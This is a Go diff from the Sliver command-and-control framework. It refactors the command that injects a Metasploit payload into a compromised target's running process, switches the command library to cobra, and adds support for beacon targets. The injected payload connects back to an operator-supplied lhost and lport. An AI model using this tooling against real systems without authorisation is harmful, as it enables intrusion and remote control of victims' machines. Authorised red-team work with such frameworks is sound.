@@ -25,34 +25,43 @@ import (
 	"github.com/bishopfox/sliver/client/console"
 	consts "github.com/bishopfox/sliver/client/constants"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
-
-	"github.com/desertbit/grumble"
+	"github.com/spf13/cobra"
+	"google.golang.org/protobuf/proto"
 )
 
-// MsfCmd - Inject a metasploit payload into the current remote process
-func MsfCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
-	session := con.ActiveTarget.GetSessionInteractive()
-	if session == nil {
+// MsfCmd - Inject a metasploit payload into the current remote process.
+func MsfCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
+	session, beacon := con.ActiveTarget.GetInteractive()
+	if session == nil && beacon == nil {
 		return
 	}
 
-	payloadName := ctx.Flags.String("payload")
-	lhost := ctx.Flags.String("lhost")
-	lport := ctx.Flags.Int("lport")
-	encoder := ctx.Flags.String("encoder")
-	iterations := ctx.Flags.Int("iterations")
+	payloadName, _ := cmd.Flags().GetString("payload")
+	lhost, _ := cmd.Flags().GetString("lhost")
+	lport, _ := cmd.Flags().GetInt("lport")
+	encoder, _ := cmd.Flags().GetString("encoder")
+	iterations, _ := cmd.Flags().GetInt("iterations")
 
 	if lhost == "" {
 		con.PrintErrorf("Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfStr)
 		return
 	}
+	var goos string
+	var goarch string
+	if session != nil {
+		goos = session.OS
+		goarch = session.Arch
+	} else {
+		goos = beacon.OS
+		goarch = beacon.Arch
+	}
 
 	ctrl := make(chan bool)
-	msg := fmt.Sprintf("Sending payload %s %s/%s -> %s:%d ...",
-		payloadName, session.OS, session.Arch, lhost, lport)
+	msg := fmt.Sprintf("Sending msf payload %s %s/%s -> %s:%d ...",
+		payloadName, goos, goarch, lhost, lport)
 	con.SpinUntil(msg, ctrl)
-	_, err := con.Rpc.Msf(context.Background(), &clientpb.MSFReq{
-		Request:    con.ActiveTarget.Request(ctx),
+	msfTask, err := con.Rpc.Msf(context.Background(), &clientpb.MSFReq{
+		Request:    con.ActiveTarget.Request(cmd),
 		Payload:    payloadName,
 		LHost:      lhost,
 		LPort:      uint32(lport),
@@ -63,7 +72,20 @@ func MsfCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	<-ctrl
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
+		return
+	}
+
+	if msfTask.Response != nil && msfTask.Response.Async {
+		con.AddBeaconCallback(msfTask.Response.TaskID, func(task *clientpb.BeaconTask) {
+			err = proto.Unmarshal(task.Response, msfTask)
+			if err != nil {
+				con.PrintErrorf("Failed to decode response %s\n", err)
+				return
+			}
+			PrintMsfRemote(msfTask, con)
+		})
+		con.PrintAsyncResponse(msfTask.Response)
 	} else {
-		con.PrintInfof("Executed payload on target\n")
+		PrintMsfRemote(msfTask, con)
 	}
 }
